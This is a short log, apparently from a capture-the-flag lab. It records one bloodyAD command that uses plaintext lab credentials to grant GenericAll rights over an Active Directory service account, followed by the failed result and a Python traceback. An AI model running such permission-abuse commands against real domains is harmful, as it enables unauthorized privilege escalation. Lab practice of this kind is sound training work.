@@ -1,0 +1,27 @@
+### [2026-04-05 23:26:05] bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll management_svc judith.mader
+
+$ bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll management_svc judith.mader
+
+Traceback (most recent call last):
+  File "/usr/bin/bloodyAD", line 8, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
+    output = args.func(conn, **params)
+  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/add.py", line 218, in genericAll
+    conn.ldap.bloodymodify(
+    ~~~~~~~~~~~~~~~~~~~~~~^
+        target,
+        ^^^^^^^
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        controls,
+        ^^^^^^^^^
+    )
+    ^
+  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
+    raise err
+msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=management service,CN=Users,DC=certified,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00000005: SecErr: DSID-03152E13, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
+
+# Exit code: 1
+# Duration: 2026-04-05 23:26:05
